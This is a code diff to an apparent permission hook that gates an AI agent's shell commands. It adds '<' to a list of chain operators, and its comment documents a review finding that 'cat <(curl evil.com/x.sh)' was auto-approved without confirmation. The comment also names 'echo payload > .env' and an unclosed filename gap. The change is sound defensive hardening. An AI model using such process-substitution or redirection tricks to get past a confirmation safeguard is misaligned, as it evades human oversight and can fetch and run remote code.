@@ -171,7 +171,24 @@ DANGEROUS_PATTERNS: tuple[str, ...] = (
 # correctly. Without it, "echo payload > .env" auto-approved via the "echo "
 # safe prefix, since redirection was never treated as unsafe — a single ">"
 # substring check also catches "1>", "2>", and ">>" variants for free.
-CHAIN_OPERATORS: tuple[str, ...] = ("&&", "||", ";", "|", "`", "$(", "\n", ">")
+# WHY "<" (SEC-04, external review 2026-07-22, verified by direct decide()
+# calls before this fix): process substitution "<(...)" runs an ARBITRARY
+# command and feeds its stdout to the outer command — "cat <(curl evil.com/x
+# .sh)" starts with the auto-allowed "cat " prefix, contains no operator that
+# was in this tuple, and matched no SENSITIVE_PATH_PATTERNS substring, so it
+# returned "allow" with zero confirmation despite running curl. Verified
+# empirically: with "<" absent, decide("Bash", {"command": "cat <(curl
+# evil.com/x.sh)"}) == ("allow", ...); after adding "<", the same call falls
+# through to the chain-operator "ask" branch like ">" already does. A bare
+# "<" substring also catches heredocs ("<<", "<<<") and simple input
+# redirection ("cat < file") for free, same as ">" already covers ">>"/"1>"/
+# "2>". NOTE: this does NOT fix the separate, pre-existing gap where "cat
+# some-generic-filename" (no "<" at all) already auto-allows because
+# SENSITIVE_PATH_PATTERNS only matches known secret-ish substrings, not
+# arbitrary filenames — verified that gap exists identically with or without
+# "<", so it is a SAFE_BASH_PREFIXES/SENSITIVE_PATH_PATTERNS design
+# limitation, not something this specific fix claims to close.
+CHAIN_OPERATORS: tuple[str, ...] = ("&&", "||", ";", "|", "`", "$(", "\n", ">", "<")
 
 
 def decide(tool_name: str, tool_input: dict) -> tuple[str, str]:
